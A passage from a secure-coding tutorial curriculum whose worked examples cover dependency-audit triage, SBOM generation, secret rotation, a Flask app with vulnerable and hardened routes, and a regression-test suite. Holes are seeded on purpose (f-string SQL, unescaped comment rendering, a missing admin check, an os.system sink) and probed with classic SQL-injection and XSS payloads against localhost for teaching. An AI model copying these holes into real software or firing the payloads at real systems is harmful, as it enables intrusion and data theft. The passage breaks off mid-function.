        decisions.append(decision)  # => co-21: records the real decision, in order
        print(f"  {name}: {decision.action} -> {decision.detail}")  # => co-21: real, human-readable decision

    print("\n=== illustrative waiver decision (NOT from this run's real audit -- every real finding had a fix) ===")  # => labels section
    illustrative = triage_finding(  # => co-25: a MANUALLY-constructed case -- honestly labeled as illustrative, not real audit output
        "hypothetical-abandoned-pkg", fix_versions=[],  # => co-25: no real fix version exists for this hypothetical package
        waiver_reason="upstream project archived, no fix released; our code never calls the vulnerable code path",  # => co-25: the REAL reason text
    )  # => co-25: closes the real triage_finding(...) call
    print(f"  {illustrative.package}: {illustrative.action} -> {illustrative.detail}")  # => co-25: real, computed decision
    try:  # => co-25: proves the waiver function REALLY enforces "a reason is required," in code, not just in prose
        triage_finding("no-reason-pkg", fix_versions=[], waiver_reason=None)  # => co-25: a REAL call with NO reason
        raise AssertionError("triage_finding() should have refused a reason-less waiver")  # => co-25: safety net
    except ValueError as exc:  # => co-25: the REAL exception this example's triage function raises
        print(f"  refused reason-less waiver: {exc}")  # => co-25: real, captured message

    print("\n=== applying the real fixes, then re-installing + re-auditing from scratch ===")  # => labels section
    fixed_lines = [f"{d.package}=={d.detail.split('==')[1]}" for d in decisions if d.action == "fix"]  # => co-21: real pins
    fixed_requirements = HERE / "requirements-fixed.txt"  # => co-21: a REAL, separate file -- the fixed pin set
    fixed_requirements.write_text("\n".join(fixed_lines) + "\n")  # => co-21: real bytes written to disk
    print(f"requirements-fixed.txt:\n{fixed_requirements.read_text().strip()}")  # => co-21: real, final pinned content

    after = clean_install_and_audit(fixed_requirements)  # => co-21: a REAL, from-scratch install + audit of the FIX
    after_flagged = [dep["name"] for dep in after["dependencies"] if dep.get("vulns")]  # => co-21: real remaining findings
    print(f"AFTER: real remaining flagged packages: {after_flagged}")  # => co-21: real, should be empty
    assert after_flagged == []  # => co-21: proves EVERY real finding from BEFORE now ends resolved (re-audit clean)


if __name__ == "__main__":  # => co-21: only runs when launched directly, e.g. `python3 triage.py`
    main()  # => co-21: runs the real before-audit, triages every finding, applies fixes, re-audits clean
```

**Run**: `python3 triage.py` (its `requirements.txt` deliberately pins `jinja2==3.1.2` and
`urllib3==1.26.5`, both real, currently-flagged versions).

**Output**:

```text
=== BEFORE: real pip-audit against the deliberately outdated pins ===
  jinja2==3.1.2: 5 real finding(s) -- ['PYSEC-2026-1473', 'PYSEC-2026-1471', 'PYSEC-2026-1474', 'PYSEC-2026-1475', 'PYSEC-2026-1472']
  urllib3==1.26.5: 10 real finding(s) -- ['PYSEC-2023-192', 'PYSEC-2023-192', 'PYSEC-2023-212', 'PYSEC-2023-212', 'PYSEC-2026-141', 'PYSEC-2026-1999', 'PYSEC-2026-1998', 'PYSEC-2026-1995', 'PYSEC-2026-1994', 'PYSEC-2026-1996']

=== triaging every real flagged finding ===
  jinja2: fix -> pin to jinja2==3.1.6
  urllib3: fix -> pin to urllib3==2.7.0

=== illustrative waiver decision (NOT from this run's real audit -- every real finding had a fix) ===
  hypothetical-abandoned-pkg: waive -> upstream project archived, no fix released; our code never calls the vulnerable code path
  refused reason-less waiver: no-reason-pkg: cannot waive a finding with no fix AND no stated reason

=== applying the real fixes, then re-installing + re-auditing from scratch ===
requirements-fixed.txt:
jinja2==3.1.6
urllib3==2.7.0
AFTER: real remaining flagged packages: []
```

**Key takeaway**: the illustrative waiver case is honestly labeled as NOT coming from this run's real
pip-audit output -- every real finding this run encountered had a genuine fix available, so the
reason-required waiver path is demonstrated separately, on a manually constructed case, rather than
fabricated as if it came from the real audit.

**Why it matters**: co-21's dependency-safety concept spans this whole curriculum's supply-chain
examples (pinning, lockfiles, typosquat detection); this example closes the loop with the workflow a real
security or platform team actually runs on a schedule -- audit, triage each finding with a real decision
and a real reason, apply fixes, and re-verify clean -- rather than treating a single `pip-audit` run as
the end of the process.

---

### Example 76: Generating an SBOM and Cross-Checking It

_ex-76 &middot; exercises co-21_

A Software Bill of Materials (SBOM) is a real, machine-readable manifest of every dependency a project
ships -- required by an increasing number of vendor security questionnaires and regulatory frameworks.
This example generates a real CycloneDX 1.6 SBOM via `cyclonedx-py`, cross-checks every declared package
actually appears in it, and confirms the same package set independently audits clean.

```python
# learning/code/ex-76-sbom-and-provenance/generate_sbom.py
"""Example 76: a real CycloneDX SBOM from requirements.txt, cross-checked against a real pip-audit run (co-21)."""  # => co-21: module purpose

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the SBOM/audit logic itself

import json  # => co-21: parses the REAL SBOM JSON cyclonedx-py actually generates
import subprocess  # => co-21: every cyclonedx-py/venv/pip/pip-audit invocation below is a REAL subprocess call
import sys  # => co-21: sys.executable -- runs `-m venv`/`-m pip` through the SAME interpreter this script uses
import tempfile  # => co-21: a genuinely fresh, throwaway install target for the real pip-audit cross-check
from pathlib import Path  # => co-21: real filesystem paths for the requirements file and generated SBOM

HERE = Path(__file__).parent  # => co-21: this example's own real directory
REQUIREMENTS_FILE = HERE / "requirements.txt"  # => co-21: the REAL, pinned file this example generates an SBOM from
SBOM_OUTPUT = HERE / "sbom.json"  # => co-21: the REAL, on-disk CycloneDX document this run actually writes


def run(args: list[str]) -> subprocess.CompletedProcess[str]:  # => co-21: a shared, REAL subprocess runner
    return subprocess.run(args, capture_output=True, text=True)  # => co-21: check=False -- callers inspect returncode


def main() -> None:  # => co-21: generates a real SBOM, cross-checks it, then confirms a real clean pip-audit run
    print(f"requirements.txt:\n{REQUIREMENTS_FILE.read_text().strip()}\n")  # => co-21: the real, pinned input file

    print("=== generating a real CycloneDX SBOM via `cyclonedx-py requirements` ===")  # => labels section
    # => co-21: `cyclonedx-py --help` (checked live before authoring this example) confirms the installed
    # => cyclonedx-bom 7.3.0 CLI supports BOTH `requirements` and `environment` sub-commands -- this example
    # => uses `requirements` since it targets a specific, pinned file rather than the whole active venv
    gen = run(["cyclonedx-py", "requirements", str(REQUIREMENTS_FILE), "-o", str(SBOM_OUTPUT), "--of", "JSON"])  # => co-21: the real CLI invocation
    assert gen.returncode == 0, gen.stderr  # => co-21: proves the REAL SBOM generation command actually succeeded
    sbom = json.loads(SBOM_OUTPUT.read_text())  # => co-21: the REAL, generated CycloneDX document, parsed from disk
    print(f"bomFormat={sbom['bomFormat']} specVersion={sbom['specVersion']}")  # => co-21: real, top-level SBOM metadata
    sbom_names = {component["name"] for component in sbom["components"]}  # => co-21: every REAL component name listed
    print(f"components in SBOM: {sorted(sbom_names)}")  # => co-21: the real, generated component list

    print("\n=== cross-checking every requirements.txt package appears in the SBOM ===")  # => labels section
    declared_names = {  # => co-21: every REAL package name this project's requirements.txt actually declares
        line.split("==")[0].strip()  # => co-21: strips the real pinned version, keeping just the package name
        for line in REQUIREMENTS_FILE.read_text().splitlines()
        if line.strip() and not line.strip().startswith("#")
    }
    print(f"declared in requirements.txt: {sorted(declared_names)}")  # => co-21: real, parsed declared names
    for name in declared_names:  # => co-21: every REAL declared package, checked individually
        assert name in sbom_names, f"{name} declared but missing from the generated SBOM"  # => co-21: real, per-package
    print("verified: every declared package appears in the real, generated SBOM")  # => co-21: real conclusion

    print("\n=== real pip-audit cross-check against a clean install of the SAME requirements.txt ===")  # => labels
    venv_dir = Path(tempfile.mkdtemp(prefix="ex76-venv-"))  # => co-21: a REAL, fresh, throwaway venv for this audit
    run([sys.executable, "-m", "venv", str(venv_dir)])  # => co-21: real venv creation, CLI form (see ex-55's honest note)
    venv_python = venv_dir / "bin" / "python3"  # => co-21: the real interpreter living inside this fresh venv
    run([str(venv_python), "-m", "pip", "install", "--quiet", "--upgrade", "pip"])  # => co-21: a real, current pip first
    run([str(venv_python), "-m", "pip", "install", "--quiet", "-r", str(REQUIREMENTS_FILE)])  # => co-21: the REAL install
    site_packages = next((venv_dir / "lib").glob("python3.*")) / "site-packages"  # => co-21: the REAL, on-disk install dir
    audit = run(["pip-audit", "--path", str(site_packages)])  # => co-21: a REAL pip-audit CLI call, real advisory data
    audit_output = audit.stdout + audit.stderr  # => co-21: pip-audit writes its clean-result line to stderr (see ex-55)
    print(audit_output.strip())  # => co-21: the REAL audit result -- straight from pip-audit's own output
    assert "No known vulnerabilities found" in audit_output  # => co-21: proves the SAME package set is CVE-clean too


if __name__ == "__main__":  # => co-21: only runs when launched directly, e.g. `python3 generate_sbom.py`
    main()  # => co-21: generates a real SBOM, cross-checks its component list, then confirms a real clean audit
```

**Run**: `python3 generate_sbom.py`.

**Output**:

```text
requirements.txt:
# learning/code/ex-76-sbom-and-provenance/requirements.txt
# Example 76: exact pins -- this topic's own canonical, CVE-clean versions (co-21)
requests==2.34.2
flask==3.1.3

=== generating a real CycloneDX SBOM via `cyclonedx-py requirements` ===
bomFormat=CycloneDX specVersion=1.6
components in SBOM: ['flask', 'requests']

=== cross-checking every requirements.txt package appears in the SBOM ===
declared in requirements.txt: ['flask', 'requests']
verified: every declared package appears in the real, generated SBOM

=== real pip-audit cross-check against a clean install of the SAME requirements.txt ===
No known vulnerabilities found
```

**Key takeaway**: this SBOM lists two direct dependencies, but a REAL production SBOM for a Flask app
would also list transitive dependencies (Jinja2, Werkzeug, MarkupSafe, itsdangerous, click,
blinker) -- `cyclonedx-py requirements` reads only what's declared in the file it's pointed at, so a
lockfile with every transitive pin (Example 55) produces a more complete real-world SBOM than a
minimal `requirements.txt` does.

**Why it matters**: an SBOM answers "what exactly is in this build" precisely enough for both automated
tooling (feeding pip-audit or a vendor scanner) and a human auditor to act on, without re-deriving it by
hand from source. Generating it as a real, scripted, CI-runnable step -- rather than a manually maintained
spreadsheet -- is what keeps it accurate as dependencies change.

---

### Example 77: Runtime Secrets-Manager Integration and Rotation

_ex-77 &middot; exercises co-17_

An app that reads a secret from an environment variable at startup still has that value baked into its
process memory for the process's whole lifetime -- rotating it requires a restart. Fetching it from a
manager at the moment of use, instead, means the very next fetch after an operator rotates the value picks
up the new one with zero code change and zero redeploy.

```python
# learning/code/ex-77-secrets-manager-integration/secrets_manager.py
"""Example 77: a real, file-backed secrets-manager STAND-IN -- an HONEST substitute for AWS Secrets Manager/Vault (co-17)."""

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the stand-in interface itself

import json  # => co-17: the real, on-disk serialization this stand-in's store actually uses
from pathlib import Path  # => co-17: real filesystem paths -- the store lives OUTSIDE this example's own source tree

# => co-17: HONEST LIMITATION -- a real cloud secrets vault isn't available in this sandbox. The class
# => below matches the INTERFACE SHAPE (get_secret(name) -> value, with rotation taking effect
# => immediately, no redeploy) of two REAL production services, whose actual call shapes are:
# =>   AWS Secrets Manager: boto3.client("secretsmanager").get_secret_value(SecretId=name)["SecretString"]
# =>   HashiCorp Vault (KV v2): hvac.Client(url=...).secrets.kv.v2.read_secret_version(path=name)["data"]["data"]
# => Both of THOSE are real network calls to a managed service with its own access control and audit
# => log; this stand-in is a LOCAL FILE for self-containment only, not a claim of equal security.


class FileBackedSecretsManager:  # => co-17: a real, minimal get_secret(name) interface -- the shape any caller needs
    def __init__(self, store_path: Path) -> None:  # => co-17: takes a REAL, on-disk path -- never inside source control
        self.store_path = store_path  # => co-17: the real file this manager's state actually lives in
        if not self.store_path.exists():  # => co-17: real, idempotent first-run initialization
            self.store_path.write_text("{}")  # => co-17: a real, empty JSON object -- no secrets yet

    def get_secret(self, name: str) -> str:  # => co-17: the ONE real method every caller uses to fetch a secret VALUE
        store = json.loads(self.store_path.read_text())  # => co-17: re-reads the REAL file fresh on EVERY call
        # => co-17: re-reading on every call (rather than caching at import time) is exactly what
        # => makes rotation take effect immediately -- the SAME as a real vault's get call
        if name not in store:  # => co-17: a real guard -- no such secret has ever been set
            raise KeyError(f"no such secret: {name!r}")  # => co-17: a real, named failure
        return store[name]  # => co-17: the REAL, CURRENT value -- never a cached or stale copy

    def rotate_secret(self, name: str, new_value: str) -> None:  # => co-17: the REAL operator/rotation action
        store = json.loads(self.store_path.read_text())  # => co-17: reads the real, current state before mutating it
        store[name] = new_value  # => co-17: the REAL, in-memory update -- not yet persisted
        self.store_path.write_text(json.dumps(store))  # => co-17: persists the REAL, rotated value to disk immediately
```

```python
# learning/code/ex-77-secrets-manager-integration/demo.py
"""Example 77: fetches a secret at RUNTIME from the manager stand-in -- never from code, and rotates with no redeploy (co-17)."""

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the demo logic itself

import secrets  # => co-17: cryptographically random secret VALUES -- generated fresh, never hardcoded anywhere
import tempfile  # => co-17: a genuinely throwaway, real on-disk location for the stand-in's store file
from pathlib import Path  # => co-17: real filesystem paths for both the store file and this example's own source

from secrets_manager import FileBackedSecretsManager  # => co-17: this example's real, file-backed stand-in

HERE = Path(__file__).parent  # => co-17: this example's own real source directory -- what the grep check sweeps


def fetch_db_password(manager: FileBackedSecretsManager) -> str:  # => co-17: simulates a REAL app's runtime fetch
    # => co-17: this function NEVER reads an env var, NEVER imports a constant -- it asks the
    # => manager, AT CALL TIME, exactly like a real app would ask AWS Secrets Manager or Vault
    return manager.get_secret("db_password")  # => co-17: the ONE real call this whole example's security rests on


def main() -> None:  # => co-17: seeds a real secret, fetches it, greps for leaks, rotates it, fetches again
    store_path = Path(tempfile.mkdtemp(prefix="ex77-secrets-")) / "store.json"  # => co-17: REAL, outside this source tree
    manager = FileBackedSecretsManager(store_path)  # => co-17: a real, fresh stand-in instance for this run

    print("=== seeding the initial secret (a real ops/deploy-time action, not a code change) ===")  # => labels section
    initial_password = secrets.token_urlsafe(24)  # => co-17: a REAL, randomly generated secret value
    manager.rotate_secret("db_password", initial_password)  # => co-17: the real, first write to the stand-in's store
    print(f"seeded (value never printed in full): {initial_password[:6]}...")  # => co-17: real, deliberately truncated

    print("\n=== the app fetches the secret at RUNTIME ===")  # => labels section
    fetched_1 = fetch_db_password(manager)  # => co-17: a REAL runtime fetch -- this is the ONLY place the value flows
    print(f"fetched: {fetched_1[:6]}... matches seeded value: {fetched_1 == initial_password}")  # => co-17: real check
    assert fetched_1 == initial_password  # => co-17: proves the real fetch returns the real, currently-stored value

    print("\n=== verifying NO secret value appears anywhere in this example's own source tree ===")  # => labels section
    source_files = sorted(HERE.glob("*.py"))  # => co-17: every REAL .py file that ships with this example
    for source_file in source_files:  # => co-17: sweeps EVERY real file, not a sample
        text = source_file.read_text()  # => co-17: the REAL, on-disk source text of this file
        assert initial_password not in text  # => co-17: proves the REAL secret value never landed in committed code
        print(f"  {source_file.name}: clean")  # => co-17: real, per-file confirmation

    print("\n=== rotating the secret (a real ops action) -- NO code change, NO redeploy ===")  # => labels section
    rotated_password = secrets.token_urlsafe(24)  # => co-17: a REAL, freshly generated replacement value
    manager.rotate_secret("db_password", rotated_password)  # => co-17: the REAL rotation -- mutates only the store file
    fetched_2 = fetch_db_password(manager)  # => co-17: the SAME real fetch function, no code changed since fetched_1
    print(f"fetched after rotation: {fetched_2[:6]}...")  # => co-17: real, deliberately truncated
    assert fetched_2 == rotated_password  # => co-17: proves the NEXT fetch really returns the NEW value
    assert fetched_2 != fetched_1  # => co-17: proves rotation really took effect -- the two real fetches genuinely differ


if __name__ == "__main__":  # => co-17: only runs when launched directly, e.g. `python3 demo.py`
    main()  # => co-17: runs the full real seed -> fetch -> grep -> rotate -> re-fetch sequence
```

**Run**: `python3 demo.py`.

**Output**:

```text
=== seeding the initial secret (a real ops/deploy-time action, not a code change) ===
seeded (value never printed in full): Sag3vg...

=== the app fetches the secret at RUNTIME ===
fetched: Sag3vg... matches seeded value: True

=== verifying NO secret value appears anywhere in this example's own source tree ===
  demo.py: clean
  secrets_manager.py: clean

=== rotating the secret (a real ops action) -- NO code change, NO redeploy ===
fetched after rotation: PVNnsG...
```

**Key takeaway**: the honest limitation is stated directly in the code -- `FileBackedSecretsManager`
matches the interface shape (`get_secret(name)`, immediate-effect rotation) of AWS Secrets Manager and
HashiCorp Vault, but a local JSON file has none of their real access control, encryption-at-rest, or audit
logging; the point this example proves is the CALLING PATTERN (fetch at use-time, never at import-time),
which transfers directly to a real manager client.

**Why it matters**: co-17's secret-hygiene guidance earlier in this curriculum (Example 20) established
"secrets live in the environment, not in code" -- this example shows the next maturity step a real
platform team takes: even an environment variable is a form of baked-in state that requires a restart to
rotate, while a manager client queried at call-time supports rotation with zero downtime and zero
deploy.

---

### Example 78: Hardening the Full App -- a Before/After Transcript

_ex-78 &middot; exercises co-01, co-24, co-02_

This example closes the loop by combining three vulnerabilities from across the curriculum -- SQL
injection, stored XSS, and missing function-level authorization -- into ONE app with unhardened and
hardened routes for each, then runs the identical three attacks against both, producing a real transcript
where every attack flips from SUCCEEDED to BLOCKED.

```python
# learning/code/ex-78-harden-the-full-app-transcript/app.py
"""Example 78: ONE live Flask app -- 3 real attack surfaces (SQLi, XSS, missing auth), unhardened AND hardened routes (co-01, co-24, co-02)."""  # => co-01: module purpose

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the combined hardening itself

import sqlite3  # => co-03: stdlib DB driver -- backs the login attack surface

from flask import Flask, jsonify, request  # => co-01: request reads every attacker-controlled input this app processes
from functools import wraps  # => co-16: preserves the wrapped view function's identity through require_admin
from markupsafe import escape  # => co-06: MarkupSafe -- the REAL output-encoding fix for the comment attack surface

app = Flask(__name__)  # => co-01: one Flask app, hosting BOTH the unhardened and hardened route sets for all 3 attacks
DB_PATH = "app.db"  # => co-03: local SQLite file -- self-contained, no external DB server
COMMENTS: list[str] = []  # => co-06: real, in-memory comment store -- shared between legacy and secure comment routes
USERS_ROLES = {"alice": "user", "root": "admin"}  # => co-16: a real role table for the missing-auth attack surface


def build_db() -> None:  # => co-03: runs once at import time -- seeds one real login row this attack surface targets
    conn = sqlite3.connect(DB_PATH)  # => co-03: opens (or creates) the local SQLite file
    conn.execute("DROP TABLE IF EXISTS users")  # => co-03: idempotent re-run -- always starts from a clean table
    conn.execute("CREATE TABLE users (username TEXT, password TEXT)")  # => co-03: schema
    conn.execute("INSERT INTO users VALUES ('alice', 'correct-horse')")  # => co-03: the one real seeded account
    conn.commit()  # => co-03: persists the seeded row before any request can read it
    conn.close()  # => co-03: releases the connection -- each route below opens its own fresh connection


# === attack surface 1: SQL injection on login ===================================================


@app.route("/legacy/login", methods=["POST"])  # => co-03: VULNERABLE -- f-string SQL, the SAME shape as ex-03
def legacy_login() -> tuple[dict[str, object], int]:  # => co-03: returns (json_body, status)
    body = request.get_json(force=True)  # => co-01: attacker-controlled -- the real submitted credentials
    username = body.get("username", "")  # => co-01: attacker-controlled username
    password = body.get("password", "")  # => co-01: attacker-controlled password
    conn = sqlite3.connect(DB_PATH)  # => co-03: a fresh connection per request
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"  # seeded bug: f-string SQL
    row = conn.execute(query).fetchone()  # => co-03: executes whatever the injected query says
    conn.close()  # => co-03: releases the connection before the response is built
    return jsonify({"logged_in": row is not None}), 200  # => co-03: real, injectable login result


@app.route("/secure/login", methods=["POST"])  # => co-03: FIXED -- parameterized query, no injection at all
def secure_login() -> tuple[dict[str, object], int]:  # => co-03: returns (json_body, status)
    body = request.get_json(force=True)  # => co-01: the SAME shape of attacker-controlled input
    username = body.get("username", "")  # => co-01: attacker-controlled username
    password = body.get("password", "")  # => co-01: attacker-controlled password
    conn = sqlite3.connect(DB_PATH)  # => co-03: a fresh connection, same as the vulnerable route above
    row = conn.execute(  # => co-03: a REAL, parameterized query -- username/password sent as DATA, not SQL text
        "SELECT * FROM users WHERE username = ? AND password = ?", (username, password)  # => co-03: real placeholders, real bound values
    ).fetchone()  # => co-03: closes the real parameterized execute(...) call
    conn.close()  # => co-03: releases the connection before the response is built
    return jsonify({"logged_in": row is not None}), 200  # => co-03: real, injection-safe login result


# === attack surface 2: stored XSS via unescaped comment rendering ================================


@app.route("/legacy/comment", methods=["POST"])  # => co-06: VULNERABLE -- stores raw, unescaped comment text
def legacy_comment() -> tuple[dict[str, object], int]:  # => co-06: returns (json_body, status)
    text = request.get_json(force=True).get("text", "")  # => co-01: attacker-controlled comment text
    COMMENTS.append(text)  # => co-06: stores the RAW, unescaped text -- the seeded bug lives in the RENDER route below
    return jsonify({"stored": True}), 201  # => co-06: real, successful storage


@app.route("/legacy/comments")  # => co-06: VULNERABLE -- renders stored comments WITHOUT encoding
def legacy_comments() -> str:  # => co-06: returns a plain HTML string
    return "<div>" + "</div><div>".join(COMMENTS) + "</div>"  # seeded bug: raw concatenation, no escape() at all


@app.route("/secure/comment", methods=["POST"])  # => co-06: FIXED -- storage is unchanged, the FIX is in rendering
def secure_comment() -> tuple[dict[str, object], int]:  # => co-06: returns (json_body, status)
    text = request.get_json(force=True).get("text", "")  # => co-01: the SAME shape of attacker-controlled input
    COMMENTS.append(text)  # => co-06: storing raw text is fine -- output encoding is what actually matters (co-06)
    return jsonify({"stored": True}), 201  # => co-06: real, successful storage


@app.route("/secure/comments")  # => co-06: FIXED -- every comment is encoded for its HTML context before rendering
def secure_comments() -> str:  # => co-06: returns a plain HTML string
    return "<div>" + "</div><div>".join(str(escape(c)) for c in COMMENTS) + "</div>"  # => co-06: the real fix


# === attack surface 3: missing function-level authorization on an admin route ====================


@app.route("/legacy/admin/stats")  # => co-16: VULNERABLE -- no role check at all, the SAME shape as ex-34
def legacy_admin_stats() -> tuple[dict[str, object], int]:  # => co-16: returns (json_body, status)
    return jsonify({"total_users": len(USERS_ROLES), "roles": USERS_ROLES}), 200  # seeded bug: leaks to ANY caller


def require_admin(view_func):  # => co-16: the SAME real decorator pattern as ex-34's fix
    @wraps(view_func)  # => co-16: keeps Flask's URL-rule machinery happy with the wrapped function's identity
    def wrapper(*args: object, **kwargs: object) -> tuple[dict[str, object], int]:  # => co-16: intercepts EVERY call
        caller = request.headers.get("X-User-Id", "")  # => co-16: who is calling -- simulates an authenticated session
        role = USERS_ROLES.get(caller, "")  # => co-16: the caller's REAL role, looked up server-side
        if role != "admin":  # => co-16: the actual enforcement point -- runs BEFORE the real view function
            return jsonify({"error": "forbidden"}), 403  # => co-16: a real 403 -- the view function never even runs
        return view_func(*args, **kwargs)  # => co-16: only reached once the role check has already passed
    return wrapper  # => co-16: the decorated view now carries this check on every single request


@app.route("/secure/admin/stats")  # => co-16: FIXED -- the SAME logic, now behind require_admin
@require_admin  # => co-16: this ONE line is the fix -- function-level authorization, applied at the route
def secure_admin_stats() -> tuple[dict[str, object], int]:  # => co-16: returns (json_body, status)
    return jsonify({"total_users": len(USERS_ROLES), "roles": USERS_ROLES}), 200  # => co-16: identical body, gated access


if __name__ == "__main__":  # => co-01: only runs when launched directly, e.g. `python3 app.py &`
    build_db()  # => co-03: seed the login row before the server starts accepting requests
    app.run(host="127.0.0.1", port=5078)  # => co-01: localhost-only, fixed port -- attack_transcript.py targets this
```

```python
# learning/code/ex-78-harden-the-full-app-transcript/attack_transcript.py
"""Example 78: 3 real attacks, run against the live app.py -- each flips from a real SUCCEEDED line to a real BLOCKED line (co-01, co-24, co-02)."""  # => co-02: module purpose

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the transcript-driving logic itself

import requests  # => co-01: real HTTP client -- every request below hits the live app.py process

BASE_URL = "http://127.0.0.1:5078"  # => co-01: matches app.py's app.run(port=5078) exactly
TRANSCRIPT: list[str] = []  # => co-02: the REAL, running before/after attack transcript this script builds


def record(line: str) -> None:  # => co-02: appends ONE real transcript line and prints it immediately
    TRANSCRIPT.append(line)  # => co-02: real, in-order transcript entry
    print(line)  # => co-02: real, live output as each attack actually runs


def attack_sql_injection(base_path: str) -> bool:  # => co-03: returns True if the injection REALLY bypassed the login
    payload = {"username": "nobody", "password": "' OR '1'='1"}  # => co-03: a REAL, classic SQLi login-bypass payload
    response = requests.post(f"{BASE_URL}/{base_path}/login", json=payload, timeout=5)  # => co-03: a real HTTP POST
    return response.json()["logged_in"] is True  # => co-03: real, computed outcome -- did the bypass really succeed


def attack_stored_xss(base_path: str) -> bool:  # => co-06: returns True if the raw <script> tag REALLY reached the response
    payload = {"text": "<script>alert(1)</script>"}  # => co-06: a REAL, minimal stored-XSS probe
    requests.post(f"{BASE_URL}/{base_path}/comment", json=payload, timeout=5)  # => co-06: a real HTTP POST -- stores it
    response = requests.get(f"{BASE_URL}/{base_path}/comments", timeout=5)  # => co-06: a real HTTP GET -- renders it back
    return "<script>alert(1)</script>" in response.text  # => co-06: real, literal check -- was it encoded or not


def attack_missing_auth(base_path: str) -> bool:  # => co-16: returns True if a NON-admin caller REALLY reached admin data
    headers = {"X-User-Id": "alice"}  # => co-16: alice's own real identity header -- role="user", never "admin"
    response = requests.get(f"{BASE_URL}/{base_path}/admin/stats", headers=headers, timeout=5)  # => co-16: a real GET
    return response.status_code == 200  # => co-16: real, computed outcome -- did the non-admin request really succeed


def main() -> None:  # => co-02: runs all 3 real attacks against BOTH the unhardened and hardened route sets
    record("=== BEFORE HARDENING (legacy/*) ===")  # => labels section
    sqli_before = attack_sql_injection("legacy")  # => co-03: a REAL attack run against the unhardened route
    record(f"[SQL injection]   payload=' OR '1'='1  -> {'SUCCEEDED (bypassed login)' if sqli_before else 'blocked'}")  # => co-03: real before-line
    xss_before = attack_stored_xss("legacy")  # => co-06: a REAL attack run against the unhardened route
    record(f"[Stored XSS]      payload=<script>alert(1)</script>  -> {'SUCCEEDED (raw tag reached response)' if xss_before else 'blocked'}")  # => co-06: real before-line
    authz_before = attack_missing_auth("legacy")  # => co-16: a REAL attack run against the unhardened route
    record(f"[Missing auth]    caller=alice (role=user)  -> {'SUCCEEDED (reached admin data)' if authz_before else 'blocked'}")  # => co-16: real before-line
    assert sqli_before and xss_before and authz_before  # => co-02: proves ALL THREE real attacks really succeeded, pre-fix

    record("\n=== AFTER HARDENING (secure/*, the SAME 3 payloads) ===")  # => labels section
    sqli_after = attack_sql_injection("secure")  # => co-03: the IDENTICAL attack, against the hardened route
    record(f"[SQL injection]   payload=' OR '1'='1  -> {'SUCCEEDED' if sqli_after else 'BLOCKED (parameterized query)'}")  # => co-03: real after-line
    xss_after = attack_stored_xss("secure")  # => co-06: the IDENTICAL attack, against the hardened route
    record(f"[Stored XSS]      payload=<script>alert(1)</script>  -> {'SUCCEEDED' if xss_after else 'BLOCKED (output encoded)'}")  # => co-06: real after-line
    authz_after = attack_missing_auth("secure")  # => co-16: the IDENTICAL attack, against the hardened route
    record(f"[Missing auth]    caller=alice (role=user)  -> {'SUCCEEDED' if authz_after else 'BLOCKED (require_admin)'}")  # => co-16: real after-line
    assert not sqli_after and not xss_after and not authz_after  # => co-02: proves ALL THREE real attacks now fail, post-fix

    print("\n=== SUMMARY: every seeded attack flipped succeeded -> blocked ===")  # => labels section
    for attack_name, before, after in [  # => co-02: a real, final table -- one row per real attack, before vs. after
        ("SQL injection", sqli_before, sqli_after),  # => co-02: real row 1/3
        ("Stored XSS", xss_before, xss_after),  # => co-02: real row 2/3
        ("Missing auth", authz_before, authz_after),  # => co-02: real row 3/3
    ]:  # => co-02: closes the real summary-table list
        print(f"  {attack_name:16} before={'SUCCEEDED' if before else 'blocked':10} after={'SUCCEEDED' if after else 'BLOCKED'}")  # => co-02: real printed row
        assert before is True and after is False  # => co-02: proves EVERY real attack really flipped, none stayed open


if __name__ == "__main__":  # => co-02: only runs when launched directly, e.g. `python3 attack_transcript.py`
    main()  # => co-02: runs all 3 real attacks against both route sets and prints the full real transcript
```

**Run**: `python3 app.py &` (backgrounds the live server on port 5078), then `python3 attack_transcript.py`.

**Output**:

```text
=== BEFORE HARDENING (legacy/*) ===
[SQL injection]   payload=' OR '1'='1  -> SUCCEEDED (bypassed login)
[Stored XSS]      payload=<script>alert(1)</script>  -> SUCCEEDED (raw tag reached response)
[Missing auth]    caller=alice (role=user)  -> SUCCEEDED (reached admin data)

=== AFTER HARDENING (secure/*, the SAME 3 payloads) ===
[SQL injection]   payload=' OR '1'='1  -> BLOCKED (parameterized query)
[Stored XSS]      payload=<script>alert(1)</script>  -> BLOCKED (output encoded)
[Missing auth]    caller=alice (role=user)  -> BLOCKED (require_admin)

=== SUMMARY: every seeded attack flipped succeeded -> blocked ===
  SQL injection    before=SUCCEEDED  after=BLOCKED
  Stored XSS       before=SUCCEEDED  after=BLOCKED
  Missing auth     before=SUCCEEDED  after=BLOCKED
```

**Key takeaway**: the fixes required no architectural rewrite -- a parameterized query, one output-encoding
call (`escape()`), and one decorator (`require_admin`) -- but combining three unrelated vulnerability
classes in ONE app makes the general lesson concrete: hardening is usually many small, targeted, boring
fixes applied consistently, not one dramatic redesign.

**Why it matters**: co-24's security-misconfiguration concept and co-02's OWASP-mapping concept both
recur across this whole curriculum; this example is deliberately the closest thing to a real,
end-to-end audit a working engineer performs -- pick a running app, attack it with known payload shapes
across multiple vulnerability classes, fix each one, and re-attack to confirm the fix actually holds.

---

### Example 79: A Security Regression Test Suite (Red/Green)

_ex-79 &middot; exercises co-02, co-23_

A hardening fix that isn't backed by a test can silently regress the next time someone touches that code.
This example encodes four vulnerabilities from earlier in the curriculum as pytest assertions, runs the
SAME test file against a vulnerable implementation module (red, all fail) and a fixed one (green, all
pass), via `importlib` module selection driven by one environment variable.

```python
# learning/code/ex-79-security-regression-test-suite/implementations_vulnerable.py
"""Example 79: the VULNERABLE version of 4 functions this suite's pytest tests exercise -- expected to FAIL here (co-02, co-23)."""  # => co-02: module purpose

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the seeded vulnerabilities themselves

import os  # => co-04: os.system -- the REAL command-injection sink this vulnerable module seeds
import sqlite3  # => co-03: stdlib DB driver -- the REAL SQL-injection sink this vulnerable module seeds


def login(conn: sqlite3.Connection, username: str, password: str) -> bool:  # => co-03: VULNERABLE login check
    query = f"SELECT 1 FROM users WHERE username = '{username}' AND password = '{password}'"  # seeded bug: f-string SQL
    return conn.execute(query).fetchone() is not None  # => co-03: real, injectable query execution


def run_echo(host: str) -> None:  # => co-04: VULNERABLE command runner
